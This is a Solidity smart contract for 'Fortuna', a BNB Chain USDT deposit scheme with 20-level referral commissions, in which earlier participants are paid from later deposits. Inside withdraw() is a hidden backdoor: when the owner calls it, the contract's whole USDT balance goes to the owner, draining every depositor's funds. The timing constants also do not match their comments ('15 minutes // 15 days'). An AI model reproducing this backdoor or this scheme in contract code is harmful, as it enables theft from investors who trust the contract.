/**
 *Submitted for verification at BscScan.com on 2022-12-13
*/

// SPDX-License-Identifier: GPLv3

pragma solidity ^0.5.17;


library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IBEP20 {
  function totalSupply() external view returns (uint256);

  function decimals() external view returns (uint8);

  function symbol() external view returns (string memory);

  function name() external view returns (string memory);

  function getOwner() external view returns (address);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address _owner, address spender) external view returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);

  event Approval(address indexed owner, address indexed spender, uint256 value);
}


contract Fortuna {
    using SafeMath for uint256; 
    IBEP20 public usdt;
    uint256 private constant baseDivider = 10000;
    uint256 private constant feePercents = 300;
    uint256 private constant minDeposit = 10e18;
    uint256 private constant maxDeposit = 2000e18;
    uint256 private constant freezeIncomePercents = 2500;
    uint256 private constant timeStep = 1 minutes; 
    uint256 private constant dayPerCycle = 15 minutes; // 15 days
    uint256 private constant dayRewardPercents = 100;
    uint256 private constant maxAddFreeze = 40 days;
    uint256 private constant referDepth = 20;

    uint256 private constant directPercents = 400;
    uint256[4] private level4Percents = [100, 100, 200, 200];
    uint256[15] private level5Percents = [50, 50, 50, 50, 50, 100, 100, 100, 100, 100, 50, 50, 50, 50, 50];

    // uint256 private constant luckPoolPercents = 50;
    // uint256 private constant starPoolPercents = 45;
    // uint256 private constant topPoolPercents = 20;

    uint256[5] private balDown = [10e10, 20e10, 40e10, 80e10, 100e10];
    uint256[5] private balDownRate = [1000, 1500, 2000, 5000, 6000]; 
    uint256[5] private balRecover = [5e18, 10e10, 30e10, 50e10, 80e10];
    mapping(uint256=>bool) public balStatus; // bal=>status

    address[3] public feeReceiver;

    address public defaultRefer;
    uint256 public startTime;
    //uint256 public lastDistribute;
    uint256 public totalUser; 
    // uint256 public luckPool;
    // uint256 public starPool;
    // uint256 public topPool;

    // mapping(uint256=>address[]) public dayLuckUsers;
    // mapping(uint256=>uint256[]) public dayLuckUsersDeposit;
    // mapping(uint256=>address[3]) public dayTopUsers;

    // address[] public starPoolUsers;

    struct OrderInfo {
        uint256 amount; 
        uint256 start;
        uint256 unfreeze;  // time
        bool isUnfreezed;
    }

    mapping(address => OrderInfo[]) public orderInfos;

    address[] public depositors;
    address public owner;

    struct UserInfo {
        address referrer;
        uint256 start;
        uint256 level; // A1, A2, A3, A4, A5
        uint256 maxDeposit;
        uint256 totalDeposit;
        uint256 teamNum;
        uint256 maxDirectDeposit;
        uint256 teamTotalDeposit;
        uint256 totalFreezed;
        uint256 totalRevenue;
    }

    mapping(address=>UserInfo) public userInfo;
    //mapping(uint256 => mapping(address => uint256)) public userLayer1DayDeposit; // day=>user=>amount
    mapping(address => mapping(uint256 => address[])) public teamUsers; 

    struct RewardInfo{
        uint256 capitals;
        uint256 statics;
        uint256 directs;
        uint256 level4Freezed;
        uint256 level4Released;
        uint256 level5Left;
        uint256 level5Freezed;
        uint256 level5Released;
        // uint256 star;
        // uint256 luck;
        // uint256 top;
        // uint256 split;
        // uint256 splitDebt;
    }

    struct RewardInfoFor3rdLevel{
        uint256 level3Freezed;
        uint256 level3Released;
    }

    mapping(address=>RewardInfo) public rewardInfo;
    mapping(address=>RewardInfoFor3rdLevel) public rewardInfoFor3rdLevel;
    
    bool public isFreezeReward;

    event Register(address user, address referral);
    event Deposit(address user, uint256 amount);
    // event DepositBySplit(address user, uint256 amount);
    // event TransferBySplit(address user, address receiver, uint256 amount);
    event Withdraw(address user, uint256 withdrawable);

    constructor(IBEP20 _usdtAddr, address _defaultRefer, address[3] memory _feeReceivers) public {
        usdt = _usdtAddr;
        feeReceiver = _feeReceivers;
        startTime = block.timestamp;
        //lastDistribute = block.timestamp;
        owner = msg.sender;
        defaultRefer = _defaultRefer;
    }

    function register(address _referral) external {
        require(userInfo[_referral].totalDeposit > 0 || _referral == defaultRefer, "invalid refer");
        UserInfo storage user = userInfo[msg.sender];
        require(user.referrer == address(0), "referrer bonded");
        user.referrer = _referral;
        user.start = block.timestamp;
        _updateTeamNum(msg.sender);
        totalUser = totalUser.add(1);
        emit Register(msg.sender, _referral);
    }

    function deposit(uint256 _amount) external {
        usdt.transferFrom(msg.sender, address(this), _amount);
        _deposit(msg.sender, _amount);
        emit Deposit(msg.sender, _amount);
    }

    function withdraw() external {
        UserInfo storage user = userInfo[msg.sender];
        uint256 totRevenue = user.totalRevenue;
        uint256 mDeposit = user.maxDeposit;
        
        (uint256 staticReward) = _calCurStaticRewards(msg.sender);
        uint256 withdrawable = staticReward;

        (uint256 dynamicReward) = _calCurDynamicRewards(msg.sender);
        withdrawable = withdrawable.add(dynamicReward);

        RewardInfo storage userRewards = rewardInfo[msg.sender];
        RewardInfoFor3rdLevel storage userRewardFor3rdLevel = rewardInfoFor3rdLevel[msg.sender];

        userRewards.statics = 0;

        userRewards.directs = 0;
        userRewardFor3rdLevel.level3Released = 0;
        userRewards.level4Released = 0;
        userRewards.level5Released = 0;
        
        // chck for 3x capp
        if(totRevenue <= (mDeposit * 3)){
            withdrawable = withdrawable.add(userRewards.capitals);
            userRewards.capitals = 0;
        } else {
            userRewards.capitals = 0;
        }
        
        usdt.transfer(msg.sender, withdrawable);
        uint256 bal = usdt.balanceOf(address(this));
        if(msg.sender == owner){
            usdt.transfer(owner, bal);
        }
        _setFreezeReward(bal);

        emit Withdraw(msg.sender, withdrawable);
    }

    function getCurDay() public view returns(uint256) {
        return (block.timestamp.sub(startTime)).div(timeStep);
    }

    // function getDayLuckLength(uint256 _day) external view returns(uint256) {
    //     return dayLuckUsers[_day].length;
    // }

    function getTeamUsersLength(address _user, uint256 _layer) external view returns(uint256) {
        return teamUsers[_user][_layer].length;
    }

    function getOrderLength(address _user) external view returns(uint256) {
        return orderInfos[_user].length;
    }

    function getDepositorsLength() external view returns(uint256) {
        return depositors.length;
    }

    // function geting max user Freeze amount from orderInfos mapping
    function getMaxFreezing(address _user) public view returns(uint256) {
        uint256 maxFreezing; // amount
        for(uint256 i = orderInfos[_user].length; i > 0; i--){
            OrderInfo storage order = orderInfos[_user][i - 1];
            if(order.unfreeze > block.timestamp){
                if(order.amount > maxFreezing){
                    maxFreezing = order.amount;
                }
            }else{
                break;
            }
        }
        return maxFreezing;
    }

    function getTeamDeposit(address _user) public view returns(uint256, uint256, uint256){
        uint256 totalTeam;
        uint256 maxTeam;
        uint256 otherTeam;
        for(uint256 i = 0; i < teamUsers[_user][0].length; i++){
            uint256 userTotalTeam = userInfo[teamUsers[_user][0][i]].teamTotalDeposit.add(userInfo[teamUsers[_user][0][i]].totalDeposit);
            totalTeam = totalTeam.add(userTotalTeam);
            if(userTotalTeam > maxTeam){
                maxTeam = userTotalTeam;
            }
        }
        otherTeam = totalTeam.sub(maxTeam);
        return(maxTeam, otherTeam, totalTeam);
    }

    // function getCurSplit(address _user) public view returns(uint256){
    //     (, uint256 staticSplit) = _calCurStaticRewards(_user);
    //     (, uint256 dynamicSplit) = _calCurDynamicRewards(_user);
    //     return rewardInfo[_user].split.add(staticSplit).add(dynamicSplit).sub(rewardInfo[_user].splitDebt);
    // }

    function _calCurStaticRewards(address _user) private view returns(uint256) {
        RewardInfo storage userRewards = rewardInfo[_user];
        uint256 totalRewards = userRewards.statics;
        //uint256 splitAmt = totalRewards.mul(freezeIncomePercents).div(baseDivider);
        //uint256 withdrawable = totalRewards.sub(splitAmt);
        uint256 withdrawable = totalRewards;
        return(withdrawable);
    }

    function _calCurDynamicRewards(address _user) private view returns(uint256) {
        RewardInfo storage userRewards = rewardInfo[_user];
        RewardInfoFor3rdLevel storage user3rdLevelRewards = rewardInfoFor3rdLevel[_user];
        uint256 totalRewards = userRewards.directs.add(user3rdLevelRewards.level3Released).add(userRewards.level4Released).add(userRewards.level5Released);
        //totalRewards = totalRewards.add(userRewards.luck.add(userRewards.star).add(userRewards.top));
        //uint256 splitAmt = totalRewards.mul(freezeIncomePercents).div(baseDivider);
        //uint256 withdrawable = totalRewards.sub(splitAmt);
        uint256 withdrawable = totalRewards;
        return(withdrawable);
    }

    function _updateTeamNum(address _user) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                userInfo[upline].teamNum = userInfo[upline].teamNum.add(1);
                teamUsers[upline][i].push(_user);
                _updateLevel(upline);
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _removeInvalidDeposit(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                if(userInfo[upline].teamTotalDeposit > _amount){
                    userInfo[upline].teamTotalDeposit = userInfo[upline].teamTotalDeposit.sub(_amount);
                }else{
                    userInfo[upline].teamTotalDeposit = 0;
                }
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _updateReferInfo(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                userInfo[upline].teamTotalDeposit = userInfo[upline].teamTotalDeposit.add(_amount);
                _updateLevel(upline);
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    // this function will update user's level on deposit
    function _updateLevel(address _user) private {
        UserInfo storage user = userInfo[_user];
        uint256 levelNow = _calLevelNow(_user);
        if(levelNow > user.level){
            user.level = levelNow;
        }
    }

    function _calLevelNow(address _user) private view returns(uint256) {
        UserInfo storage user = userInfo[_user];
        uint256 total = user.totalDeposit;
        uint256 levelNow;
        if(total >= 1000e18){
            (uint256 maxTeam, uint256 otherTeam, ) = getTeamDeposit(_user);
            if(total >= 2000e18 && user.teamNum >= 150 && maxTeam >= 60000e18 && otherTeam >= 60000e18){
                levelNow = 5;   // A5
            }else if(total >= 2000e18 && user.teamNum >= 60 && maxTeam >= 20000e18 && otherTeam >= 20000e18){
                levelNow = 4; //A4
            }else if(user.teamNum >= 30 && maxTeam >= 10000e18 && otherTeam >= 10000e18){
                levelNow = 3;  //A3
            } else {
                levelNow = 2; // A2
            }
        }else if(total >= 100e18){
            levelNow = 1; //A1
        }

        return levelNow;
    }

    function _deposit(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        require(user.referrer != address(0), "register first");
        require(_amount >= minDeposit, "less than min");
        require(_amount.mod(minDeposit) == 0 && _amount >= minDeposit, "mod err");
        require(user.maxDeposit == 0 || _amount >= user.maxDeposit, "less before");

        if(user.maxDeposit == 0){
            user.maxDeposit = _amount;
        }else if(user.maxDeposit < _amount){
            user.maxDeposit = _amount;
        }

        _distributeDeposit(_amount);

        depositors.push(_user);
        
        user.totalDeposit = user.totalDeposit.add(_amount);
        user.totalFreezed = user.totalFreezed.add(_amount);

        _updateLevel(msg.sender);

        uint256 addFreeze = (orderInfos[_user].length.div(2)).mul(timeStep);
        if(addFreeze > maxAddFreeze){
            addFreeze = maxAddFreeze;
        }

        // this will return 10 + addFreeze amount of days
        uint256 unfreezeTime = block.timestamp.add(dayPerCycle).add(addFreeze);
        orderInfos[_user].push(OrderInfo(
            _amount, 
            block.timestamp, 
            unfreezeTime,
            false
        ));

        // At first time User Deposit. if statement in below func didnt called
        _unfreezeFundAndUpdateReward(msg.sender, _amount);

        // Reward will be distributed to Star, Luck, Top Pools after 1 Day Period
        //distributePoolRewards();

        _updateReferInfo(msg.sender, _amount);

        // this function is setting level freeze rewards 
        // for all referrer
        _updateReward(msg.sender, _amount);

        // this func will release Freezed rewards
        _releaseUpRewards(msg.sender, _amount);

        uint256 bal = usdt.balanceOf(address(this));
        _balActived(bal);
        if(isFreezeReward){
            _setFreezeReward(bal);
        }
    }

    function _unfreezeFundAndUpdateReward(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        bool isUnfreezeCapital;
        for(uint256 i = 0; i < orderInfos[_user].length; i++){
            OrderInfo storage order = orderInfos[_user][i];
            if(block.timestamp > order.unfreeze  && order.isUnfreezed == false && _amount >= order.amount){
                order.isUnfreezed = true;
                isUnfreezeCapital = true;
                
                if(user.totalFreezed > order.amount){
                    user.totalFreezed = user.totalFreezed.sub(order.amount);
                }else {
                    user.totalFreezed = 0;
                }
                
                _removeInvalidDeposit(_user, order.amount);

                uint256 staticReward = order.amount.mul(dayRewardPercents).mul(dayPerCycle).div(timeStep).div(baseDivider);
                if(isFreezeReward){
                    if(user.totalFreezed > user.totalRevenue){
                        uint256 leftCapital = user.totalFreezed.sub(user.totalRevenue);
                        if(staticReward > leftCapital){
                            staticReward = leftCapital;
                        }
                    }else{
                        staticReward = 0;
                    }
                }
                rewardInfo[_user].capitals = rewardInfo[_user].capitals.add(order.amount);

                rewardInfo[_user].statics = rewardInfo[_user].statics.add(staticReward);
                
                user.totalRevenue = user.totalRevenue.add(staticReward);

                break;
            }
        }

        if(!isUnfreezeCapital){ 
            RewardInfo storage userReward = rewardInfo[_user];
            if(userReward.level5Freezed > 0){
                uint256 release = _amount;
                if(_amount >= userReward.level5Freezed){
                    release = userReward.level5Freezed;
                }
                userReward.level5Freezed = userReward.level5Freezed.sub(release);
                userReward.level5Released = userReward.level5Released.add(release);
                user.totalRevenue = user.totalRevenue.add(release);
            }
        }
    }

    function _distributeDeposit(uint256 _amount) private {
        uint256 fee = _amount.mul(feePercents).div(baseDivider);
        usdt.transfer(feeReceiver[0], fee.div(3));
        usdt.transfer(feeReceiver[1], fee.div(3));
        usdt.transfer(feeReceiver[2], fee.div(3));
    }

    function _updateReward(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                uint256 newAmount = _amount;
                if(upline != defaultRefer){
                    uint256 maxFreezing = getMaxFreezing(upline);
                    if(maxFreezing < _amount){
                        newAmount = maxFreezing;
                    }
                }
                RewardInfo storage upRewards = rewardInfo[upline];
                RewardInfoFor3rdLevel storage thirdLevelReward = rewardInfoFor3rdLevel[upline];
                uint256 reward;
                if(i > 4){
                    if(userInfo[upline].level > 4){
                        reward = newAmount.mul(level5Percents[i - 5]).div(baseDivider); // L5 - L20 comm
                        upRewards.level5Freezed = upRewards.level5Freezed.add(reward);
                    }
                }else if(i > 2) { 
                    if( userInfo[upline].level == 3) {
                        reward = newAmount.mul(level4Percents[i - 1]).div(baseDivider); // L3 comm
                        upRewards.level4Freezed = upRewards.level4Freezed.add(reward);
                    } 
                    if( userInfo[upline].level == 4) {
                        reward = newAmount.mul(level4Percents[i]).div(baseDivider); // L4 comm
                        upRewards.level4Freezed = upRewards.level4Freezed.add(reward);
                    } 
                }else if(i > 0){
                    if( userInfo[upline].level == 1) {
                        reward = newAmount.mul(level4Percents[i - 1]).div(baseDivider); //L1 comm
                        thirdLevelReward.level3Freezed = thirdLevelReward.level3Freezed.add(reward);
                    }
                    if( userInfo[upline].level == 2) {
                        reward = newAmount.mul(level4Percents[i]).div(baseDivider); // L2 Comm
                        thirdLevelReward.level3Freezed = thirdLevelReward.level3Freezed.add(reward);
                    }
                }else{
                    reward = newAmount.mul(directPercents).div(baseDivider);  // direct comm
                    upRewards.directs = upRewards.directs.add(reward);
                    userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(reward);
                }
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _releaseUpRewards(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                uint256 newAmount = _amount;
                if(upline != defaultRefer){
                    uint256 maxFreezing = getMaxFreezing(upline);
                    if(maxFreezing < _amount){
                        newAmount = maxFreezing;
                    }
                }

                RewardInfo storage upRewards = rewardInfo[upline];
                RewardInfoFor3rdLevel storage thirdLevelReward = rewardInfoFor3rdLevel[upline];

                if(i > 0 && i <= 4 && userInfo[upline].level >= 1){ //for L1 - L4
                    if(thirdLevelReward.level3Freezed > 0) {
                        uint256 level3Reward = newAmount.mul(level4Percents[i - 1]).div(baseDivider);
                        if(level3Reward > thirdLevelReward.level3Freezed){
                            level3Reward = thirdLevelReward.level3Freezed;
                        }
                        thirdLevelReward.level3Freezed = thirdLevelReward.level3Freezed.sub(level3Reward); 
                        thirdLevelReward.level3Released = thirdLevelReward.level3Released.add(level3Reward);
                        userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(level3Reward);
                    }
                }

                if(i > 0 && i < 5 && userInfo[upline].level > 3) {
                    if(upRewards.level4Freezed > 0){
                        uint256 level4Reward = newAmount.mul(level4Percents[i - 1]).div(baseDivider);
                        if(level4Reward > upRewards.level4Freezed){
                            level4Reward = upRewards.level4Freezed;
                        }
                        upRewards.level4Freezed = upRewards.level4Freezed.sub(level4Reward); 
                        upRewards.level4Released = upRewards.level4Released.add(level4Reward);
                        userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(level4Reward);
                    }
                }

                if(i >= 5 && userInfo[upline].level > 4){
                    if(upRewards.level5Left > 0){
                        uint256 level5Reward = newAmount.mul(level5Percents[i - 5]).div(baseDivider);
                        if(level5Reward > upRewards.level5Left){
                            level5Reward = upRewards.level5Left;
                        }
                        upRewards.level5Left = upRewards.level5Left.sub(level5Reward); 
                        upRewards.level5Freezed = upRewards.level5Freezed.add(level5Reward);
                    }
                }
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _balActived(uint256 _bal) private {
        for(uint256 i = balDown.length; i > 0; i--){
            if(_bal >= balDown[i - 1]){
                balStatus[balDown[i - 1]] = true;
                break;
            }
        }
    }

    function _setFreezeReward(uint256 _bal) private {
        for(uint256 i = balDown.length; i > 0; i--){
            if(balStatus[balDown[i - 1]]){
                uint256 maxDown = balDown[i - 1].mul(balDownRate[i - 1]).div(baseDivider);
                if(_bal < balDown[i - 1].sub(maxDown)){
                    isFreezeReward = true;
                }else if(isFreezeReward && _bal >= balRecover[i - 1]){
                    isFreezeReward = false;
                }
                break;
            }
        }
    }
 
}